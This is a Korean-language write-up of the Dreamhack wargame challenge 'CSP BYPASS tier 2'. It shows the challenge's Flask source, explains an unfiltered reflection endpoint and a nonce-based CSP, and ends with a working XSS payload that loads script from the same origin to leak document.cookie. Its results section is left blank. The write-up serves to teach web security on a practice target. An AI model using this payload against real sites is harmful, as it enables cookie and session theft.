---
title: "CSP BYPASS tier 2"
summary: "dreamhack"
date: "2026-04-09"
category: "ctf"
section: "security"
badge: "Wargame"
badgeTone: "ctf"
ctfGroup: "wargame"
tags:
  - wargame
  - web
  - csp
  - bypass
statLabel: "tier"
statValue: "2"
heroEyebrow: "$ cat content/posts/csp-bypass-tier-2.md"
heroAvatar: "CTF"
---

# CSP BYPASS tier 2


## 문제 개요

- 챌린지 유형: Web / CSP Bypass
- 목표: CSP 제약을 우회해 스크립트 실행 또는 민감 정보 탈취

## 환경 및 조건

- CSP 정책(원문):
- 입력 지점:
- 필터링/인코딩 조건:

## 분석 과정
```python
#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)
nonce = os.urandom(16).hex()

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"


def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        service = Service(executable_path="/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True


def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)


@app.after_request
def add_header(response):
    global nonce
    response.headers[
        "Content-Security-Policy"
    ] = f"default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'self' 'nonce-{nonce}'"
    nonce = os.urandom(16).hex()
    return response


@app.route("/")
def index():
    return render_template("index.html", nonce=nonce)


@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    return param


@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html", nonce=nonce)
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return f'<script nonce={nonce}>alert("wrong??");history.go(-1);</script>'

        return f'<script nonce={nonce}>alert("good");history.go(-1);</script>'


memo_text = ""


@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text, nonce=nonce)


app.run(host="0.0.0.0", port=8000)
```
```python
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    return param
```
- 해당 부분에 param 값을 필터링 없이 그대로 반환하기 때문에 <script> 태그를 HTML 코드로 인식하고 실행 가능
- <script%20src="/vuln?param=alert(1)"></script>
```python
@app.after_request
def add_header(response):
    global nonce
    response.headers[
        "Content-Security-Policy"
    ] = f"default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'self' 'nonce-{nonce}'"
    nonce = os.urandom(16).hex()
    return response
```
- 해당 부분에 CSP 정책이 있음
```text
⇒ script-src ‘self’ ‘nonce-{nonce}’ 이 정책에 의해 nonce 속성이 존재해야 스크립트 실행 허용 or 현재 도메인에서 로드되거나 인라인으로 정의된 경우 허용
(인라인의 경우 'unsafe-inline'이 없으면 여전히 차단될 수 있지만, nonce와 함께 사용될 때는 nonce가 인라인을 허용하는 조건이 됩니다.)
```
```text
💡 핵심 아이디어
CSP를 우회하려면 self 출처를 이용해 우리가 원하는 스크립트를 로드해야 함.
인라인 코드는 nonce 없이 실행되지 않음.
```
### 최종 페이로드

```javascript
<script src="vuln?param=document.location='/memo?memo'%2bdocument.cookie></script>
```


## 결과

- 획득 정보/플래그:
- 최종 성공 스크린샷 또는 로그:


